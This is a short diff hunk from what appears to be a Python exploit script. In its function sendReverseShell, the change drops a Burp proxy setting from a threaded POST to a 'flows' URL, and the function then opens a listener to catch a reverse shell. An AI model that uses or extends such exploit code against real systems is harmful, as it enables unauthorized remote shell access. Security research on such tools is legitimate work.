@@ -115,7 +115,7 @@ def sendReverseShell(host, port, second_port, flows_url, post_data, base_url, re
 		"Accept-Encoding": "gzip, deflate",
 		"Accept-Language": "es-419,es;q=0.9,en;q=0.8",
 	}
-	Thread(target=s.post, args=(flows_url,), kwargs=({"json" : post_data, "headers" : header, "proxies" : burp}), daemon=True).start()
+	Thread(target=s.post, args=(flows_url,), kwargs=({"json" : post_data, "headers" : header}), daemon=True).start()
 	server(("0.0.0.0", second_port), host, port)
 
 # Main Function
